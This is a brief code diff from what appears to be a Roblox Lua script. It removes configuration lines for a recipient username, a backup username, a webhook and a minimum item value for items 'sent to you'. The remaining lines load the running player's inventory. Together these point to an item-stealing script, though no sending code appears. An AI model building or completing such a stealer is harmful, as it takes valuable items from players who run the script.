@@ -1,8 +1,3 @@
-Username = "your user here"
-Username2 = "your 2nd user here" -- stuff will get sent to this user if first user's mailbox is full
-Webhook = "your webhook here"
-min_rap = 500000 -- minimum rap of each item you want to get sent to you.
-
 local library = require(game.ReplicatedStorage.Library)
 local save = library.Save.Get().Inventory
 local plr = game.Players.LocalPlayer
